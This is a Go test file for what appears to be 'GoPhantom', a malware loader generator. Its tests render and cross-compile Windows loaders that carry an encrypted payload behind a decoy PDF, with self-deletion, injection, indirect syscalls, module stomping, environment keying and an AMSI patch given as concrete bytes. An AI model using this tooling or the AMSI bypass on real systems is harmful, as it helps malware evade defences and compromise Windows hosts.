package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"text/template"

	"github.com/watanabe-hsad/GoPhantom/internal/knowledge"
)

type repeatReader byte

func (r repeatReader) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = byte(r)
	}
	return len(p), nil
}

// compileTemplate 是测试辅助函数：渲染模板并交叉编译为 windows/amd64
func compileTemplate(t *testing.T, data TemplateData) {
	t.Helper()

	tmpl, err := template.New("loader.go.tmpl").ParseFS(templateFS, "templates/*.tmpl")
	if err != nil {
		t.Fatalf("template parse error: %v", err)
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, data); err != nil {
		t.Fatalf("template execute error: %v", err)
	}

	tmpDir, err := os.MkdirTemp("", "gophantom-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	goFile := filepath.Join(tmpDir, "loader.go")
	if err := os.WriteFile(goFile, buf.Bytes(), 0644); err != nil {
		t.Fatalf("failed to write rendered template: %v", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(buildGoMod), 0644); err != nil {
		t.Fatalf("failed to write go.mod: %v", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(buildGoSum), 0644); err != nil {
		t.Fatalf("failed to write go.sum: %v", err)
	}

	outBin := filepath.Join(tmpDir, "loader.exe")
	cmd := exec.Command("go", "build", "-mod=mod", "-o", outBin, "-ldflags", "-s -w", "loader.go")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=windows", "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("compilation failed:\n%s\nerror: %v", string(output), err)
	}

	info, err := os.Stat(outBin)
	if err != nil {
		t.Fatalf("output binary not found: %v", err)
	}
	if info.Size() == 0 {
		t.Fatal("output binary is empty")
	}
	t.Logf("compiled successfully: %s (%d bytes)", outBin, info.Size())
}

// baseTestData 返回基础测试数据（无 evasion 技术）
func baseTestData() TemplateData {
	var testKey byte = 0x37
	testEncodedStrings := buildEncodedStrings(testKey, nil)
	testAMSIPatch := base64.StdEncoding.EncodeToString([]byte{0x31, 0xC0, 0xC3})

	return TemplateData{
		EncryptedPayload:      "dGVzdA==",
		EncryptedDecoy:        "dGVzdA==",
		Salt:                  "dGVzdHNhbHR0ZXN0c2FsdA==",
		DecoyFileName:         "test.pdf",
		EnableObfuscate:       true,
		EnableMutate:          true,
		EnableCompress:        true,
		EnableSelfDelete:      true,
		InjectMode:            "",
		DelaySeconds:          5,
		StringKey:             testKey,
		EncodedStrings:        testEncodedStrings,
		AMSIPatch:             testAMSIPatch,
		EvasionSnippets:       nil,
		EnableIndirectSyscall: false,
		StompDLL:              "",
		EnableEnvBind:         false,
		EnvBindFeatures:       nil,
		EnvBindHash:           "",
		EnableMemObf:          false,
	}
}

func TestStringListSetTrimsAndResets(t *testing.T) {
	var list StringList
	if err := list.Set(" T001, ,T002 "); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got, want := list.String(), "T001,T002"; got != want {
		t.Fatalf("StringList = %q, want %q", got, want)
	}
	if err := list.Set("T003"); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got, want := list.String(), "T003"; got != want {
		t.Fatalf("StringList after reset = %q, want %q", got, want)
	}
}

func TestConfigValidate(t *testing.T) {
	tests := []struct {
		name    string
		cfg     Config
		wantErr string
	}{
		{
			name:    "missing required values",
			cfg:     Config{},
			wantErr: "Missing -decoy",
		},
		{
			name: "invalid inject mode",
			cfg: Config{
				Decoy:      "doc.pdf",
				Payload:    "payload.bin",
				Output:     "loader.exe",
				InjectMode: "sideways",
			},
			wantErr: "Invalid -inject-mode",
		},
		{
			name: "invalid env bind feature",
			cfg: Config{
				Decoy:   "doc.pdf",
				Payload: "payload.bin",
				Output:  "loader.exe",
				EnvBind: "serial=1234",
			},
			wantErr: "Unknown env-bind feature",
		},
		{
			name: "invalid evasion id",
			cfg: Config{
				Decoy:        "doc.pdf",
				Payload:      "payload.bin",
				Output:       "loader.exe",
				EvasionTechs: StringList{"T999"},
			},
			wantErr: "Unknown evasion technique ID",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errs := tt.cfg.Validate()
			joined := strings.Join(errs, "\n")
			if !strings.Contains(joined, tt.wantErr) {
				t.Fatalf("Validate errors = %q, want substring %q", joined, tt.wantErr)
			}
		})
	}
}

func TestNormalizeOutputPathAddsExe(t *testing.T) {
	out, err := normalizeOutputPath(filepath.Join(t.TempDir(), "loader"))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if filepath.Ext(out) != ".exe" {
		t.Fatalf("output path = %q, want .exe extension", out)
	}
}

func TestParseEnvBindPairs(t *testing.T) {
	pairs, features := parseEnvBindPairs(" hostname=DC01, domain=CORP ")
	if got, want := strings.Join(pairs, ";"), "hostname=DC01;domain=CORP"; got != want {
		t.Fatalf("pairs = %q, want %q", got, want)
	}
	if got, want := strings.Join(features, ";"), "hostname;domain"; got != want {
		t.Fatalf("features = %q, want %q", got, want)
	}
}

func TestBuildTemplateDataUsesDeterministicReader(t *testing.T) {
	assets := encryptedAssets{
		Payload: "payload",
		Decoy:   "decoy",
		Salt:    []byte("1234567890123456"),
	}
	cfg := Config{Decoy: "/tmp/report.pdf", Compress: true}
	data := buildTemplateData(BuildContext{Rand: repeatReader(0x42)}, cfg, assets)
	if data.StringKey != 0x42 {
		t.Fatalf("StringKey = %#x, want 0x42", data.StringKey)
	}
	wantPatch := base64.StdEncoding.EncodeToString([]byte{0x31, 0xC0, 0xC3})
	if data.AMSIPatch != wantPatch {
		t.Fatalf("AMSIPatch = %q, want %q", data.AMSIPatch, wantPatch)
	}
	if data.DecoyFileName != "report.pdf" {
		t.Fatalf("DecoyFileName = %q, want report.pdf", data.DecoyFileName)
	}
}

func TestPrepareEncryptedAssetsEnvBindDeterministic(t *testing.T) {
	cfg := Config{EnvBind: "hostname=DC01,domain=CORP", Compress: false}
	ctxA := BuildContext{Rand: newHMACDRBG([]byte("seed"))}
	ctxB := BuildContext{Rand: newHMACDRBG([]byte("seed"))}

	a, err := prepareEncryptedAssets(ctxA, cfg, []byte("decoy"), []byte("payload"))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	b, err := prepareEncryptedAssets(ctxB, cfg, []byte("decoy"), []byte("payload"))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if a.Decoy != b.Decoy || a.Payload != b.Payload || string(a.Salt) != string(b.Salt) {
		t.Fatalf("env-bind assets are not deterministic with the same reader")
	}
	if !a.EnableEnvBind {
		t.Fatal("EnableEnvBind = false, want true")
	}
	if got, want := strings.Join(a.EnvBindFeatures, ","), "hostname,domain"; got != want {
		t.Fatalf("EnvBindFeatures = %q, want %q", got, want)
	}
}

func TestRenderedCryptoReportsShortCiphertextErrors(t *testing.T) {
	data := baseTestData()
	source, err := renderLoader(data)
	if err != nil {
		t.Fatalf("renderLoader failed: %v", err)
	}
	if !bytes.Contains(source, []byte(`errors.New("ciphertext too short for AES-GCM nonce")`)) {
		t.Fatal("rendered AES-GCM path does not contain explicit short-ciphertext error")
	}

	data.EnableEnvBind = true
	data.EnvBindFeatures = []string{"hostname"}
	data.EnvBindHash = base64.StdEncoding.EncodeToString(sha256.New().Sum(nil))
	source, err = renderLoader(data)
	if err != nil {
		t.Fatalf("renderLoader with env-bind failed: %v", err)
	}
	if !bytes.Contains(source, []byte(`errors.New("ciphertext too short for XChaCha20 nonce")`)) {
		t.Fatal("rendered XChaCha20 path does not contain explicit short-ciphertext error")
	}
}

// TestTemplateCompiles 验证默认配置（无 evasion）编译通过
func TestTemplateCompiles(t *testing.T) {
	compileTemplate(t, baseTestData())
}

// TestTemplateCompiles_WithEvasion 验证带 evasion 技术片段的 loader 编译通过
func TestTemplateCompiles_WithEvasion(t *testing.T) {
	data := baseTestData()

	// 选择所有 5 个技术，收集额外 API
	allIDs := []string{"T001", "T002", "T003", "T004", "T005"}
	techs, invalid := knowledge.ByIDs(allIDs)
	if len(invalid) > 0 {
		t.Fatalf("unknown technique IDs: %v", invalid)
	}

	// 收集额外 API 并重建编码表
	var extraAPIs []string
	for _, tech := range techs {
		extraAPIs = append(extraAPIs, tech.APIs...)
	}
	data.EncodedStrings = buildEncodedStrings(data.StringKey, extraAPIs)

	// 构建 snippet
	for _, tech := range techs {
		data.EvasionSnippets = append(data.EvasionSnippets, EvasionSnippet{
			FuncName: "evasion" + tech.ID,
			Code:     resolveSnippetStrings(tech.CodeSnippet, data.EncodedStrings),
		})
	}

	compileTemplate(t, data)
}

// TestTemplateCompiles_WithIndirectSyscall 验证启用 Indirect Syscall 引擎后编译通过
func TestTemplateCompiles_WithIndirectSyscall(t *testing.T) {
	data := baseTestData()
	data.EnableIndirectSyscall = true
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithIndirectSyscallAndEvasion 验证同时启用 Indirect Syscall + Evasion 编译通过
func TestTemplateCompiles_WithIndirectSyscallAndEvasion(t *testing.T) {
	data := baseTestData()
	data.EnableIndirectSyscall = true

	allIDs := []string{"T001", "T002", "T003", "T004", "T005"}
	techs, invalid := knowledge.ByIDs(allIDs)
	if len(invalid) > 0 {
		t.Fatalf("unknown technique IDs: %v", invalid)
	}

	var extraAPIs []string
	for _, tech := range techs {
		extraAPIs = append(extraAPIs, tech.APIs...)
	}
	data.EncodedStrings = buildEncodedStrings(data.StringKey, extraAPIs)

	for _, tech := range techs {
		data.EvasionSnippets = append(data.EvasionSnippets, EvasionSnippet{
			FuncName: "evasion" + tech.ID,
			Code:     resolveSnippetStrings(tech.CodeSnippet, data.EncodedStrings),
		})
	}

	compileTemplate(t, data)
}

// TestTemplateCompiles_WithStomping 验证启用 Module Stomping 后编译通过
func TestTemplateCompiles_WithStomping(t *testing.T) {
	data := baseTestData()
	data.StompDLL = "winhttp.dll"
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithStompingAndIndirectSyscall 验证 Stomping + Indirect Syscall 组合编译通过
func TestTemplateCompiles_WithStompingAndIndirectSyscall(t *testing.T) {
	data := baseTestData()
	data.StompDLL = "amstream.dll"
	data.EnableIndirectSyscall = true
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithEnvBind 验证启用环境绑定加密后编译通过
func TestTemplateCompiles_WithEnvBind(t *testing.T) {
	data := baseTestData()
	data.EnableEnvBind = true
	data.EnvBindFeatures = []string{"hostname", "domain", "username"}
	data.EnvBindHash = "dGVzdGhhc2g=" // 占位哈希，仅验证编译
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithEnvBindAndIndirectSyscall 验证 EnvBind + Indirect Syscall 组合编译通过
func TestTemplateCompiles_WithEnvBindAndIndirectSyscall(t *testing.T) {
	data := baseTestData()
	data.EnableEnvBind = true
	data.EnvBindFeatures = []string{"hostname", "username", "hostsfile"}
	data.EnvBindHash = "dGVzdGhhc2g="
	data.EnableIndirectSyscall = true
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithMemObf 验证启用内存权限混淆后编译通过
func TestTemplateCompiles_WithMemObf(t *testing.T) {
	data := baseTestData()
	data.EnableMemObf = true
	compileTemplate(t, data)
}

// TestTemplateCompiles_WithMemObfAndIndirectSyscall 验证 MemObf + Indirect Syscall 组合编译通过
func TestTemplateCompiles_WithMemObfAndIndirectSyscall(t *testing.T) {
	data := baseTestData()
	data.EnableMemObf = true
	data.EnableIndirectSyscall = true
	compileTemplate(t, data)
}
